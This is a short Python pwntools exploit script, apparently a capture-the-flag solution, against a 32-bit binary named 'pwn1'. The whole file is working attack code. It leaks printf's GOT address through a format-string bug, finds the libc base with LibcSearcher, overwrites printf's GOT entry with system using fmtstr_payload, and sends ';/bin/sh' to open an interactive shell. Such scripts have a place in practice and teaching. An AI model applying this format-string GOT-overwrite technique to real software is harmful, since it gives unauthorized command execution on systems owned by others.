#-*- coding:utf-8 –*-
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')
#log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
Debug = 1
if Debug:
    io = process("./pwn1")
else:
    io = remote('',)

#dump bin can not be loaded
#but can analysis
offset = 8
#step 1 leak the printf_got
#maybe plt 08048400
io.recvuntil('Please tell me:')
printf_got = 0x0804A014
payload_leak = 'x' + p32(printf_got) + "%8$s"
io.send(payload_leak)
libc_printf = u32(io.recv()[14:18])
print hex(libc_printf)

#step 2 find the libc
libc = LibcSearcher('printf',libc_printf)
libcbase = libc_printf - libc.dump('printf')
system_addr = libcbase + libc.dump('system')

#step 3 cover the address
payload_cover = 'x' + fmtstr_payload(8,{printf_got : system_addr},numbwritten=10)
io.sendline(payload_cover)
io.recv()

#step 4 get shell
io.sendline(";/bin/sh")

io.interactive()
